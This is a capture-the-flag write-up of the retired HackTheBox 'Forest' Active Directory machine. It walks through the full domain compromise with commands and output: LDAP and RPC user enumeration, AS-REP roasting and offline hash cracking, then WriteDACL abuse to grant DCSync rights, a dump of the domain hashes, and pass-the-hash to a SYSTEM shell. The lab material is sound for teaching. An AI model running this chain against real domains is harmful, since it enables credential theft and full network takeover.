# HackTheBox — Forest

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows (Active Directory)  
**Category:** Active Directory / AS-REP Roasting / DCSync  
**Status:** Retired  

---

## Summary

Forest is an Active Directory domain controller box. The path involves LDAP enumeration to find users, AS-REP Roasting to recover a hash for a user without Kerberos pre-auth, cracking the hash offline, and privilege escalation via WriteDACL permissions on the domain to perform a DCSync attack and dump all hashes.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/forest 10.10.10.161
```

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI 2.4 (WinRM)
```

Domain: **htb.local**

---

## Enumeration

### LDAP Anonymous Bind — User Enumeration

```bash
ldapsearch -x -H ldap://10.10.10.161 \
  -b "DC=htb,DC=local" \
  "(objectClass=user)" sAMAccountName
```

Users found (relevant):

```
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: svc-alfresco
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
```

### RPC Enumeration (Null Session)

```bash
rpcclient -U "" -N 10.10.10.161
rpcclient$> enumdomusers
```

Returns a full user list.

---

## Initial Foothold

### AS-REP Roasting

AS-REP Roasting targets accounts with Kerberos pre-authentication disabled. When pre-auth is off, anyone can request an AS-REP ticket encrypted with the user's password hash.

```bash
GetNPUsers.py htb.local/ -usersfile users.txt \
  -no-pass -dc-ip 10.10.10.161 \
  -format hashcat -outputfile hashes.asreproast
```

`svc-alfresco` has pre-auth disabled:

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:1a2b3c4d...
```

### Cracking the Hash

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

Password: **s3rvice**

### WinRM Access

Port 5985 is open — try Evil-WinRM:

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

**Shell as svc-alfresco.**

---

## User Flag

```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
```

---

## Privilege Escalation

### BloodHound Enumeration

Upload and run SharpHound on the target:

```powershell
# Upload SharpHound
upload SharpHound.exe
./SharpHound.exe --CollectionMethods All --Domain htb.local
```

Download the ZIP and import into BloodHound.

### BloodHound Analysis

Path: `svc-alfresco` → member of `Service Accounts` → `Privileged IT Accounts` → `Account Operators` → has `GenericAll` on `Exchange Windows Permissions` group → which has **WriteDACL** on the domain.

### Exploit Path: WriteDACL → DCSync

**Step 1:** Add svc-alfresco to "Exchange Windows Permissions":

```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain
```

**Step 2:** Grant DCSync rights:

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword)

Add-DomainObjectAcl -Credential $Cred \
  -TargetIdentity "DC=htb,DC=local" \
  -Rights DCSync \
  -PrincipalIdentity svc-alfresco
```

**Step 3:** DCSync — dump all hashes:

```bash
secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
```

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Pass the Hash

```bash
psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 \
  administrator@10.10.10.161
```

**SYSTEM / Domain Admin shell.**

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- **LDAP anonymous bind** is common on older DCs — always try unauthenticated queries first
- **AS-REP Roasting** works on any account without Kerberos pre-auth — check with `GetNPUsers.py`
- **BloodHound** is essential for AD privilege escalation path finding — always run it
- **WriteDACL** on the domain object = ability to grant DCSync = game over
- DCSync mimics domain controller replication and dumps all password hashes
- `evil-winrm` is the go-to tool for WinRM access on HTB AD boxes

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| ldapsearch | LDAP user enumeration |
| rpcclient | RPC null session |
| Impacket GetNPUsers | AS-REP Roasting |
| hashcat | Offline hash cracking |
| Evil-WinRM | WinRM shell access |
| BloodHound / SharpHound | AD path enumeration |
| PowerView | ACL manipulation |
| Impacket secretsdump | DCSync attack |
| Impacket psexec | Pass-the-hash |
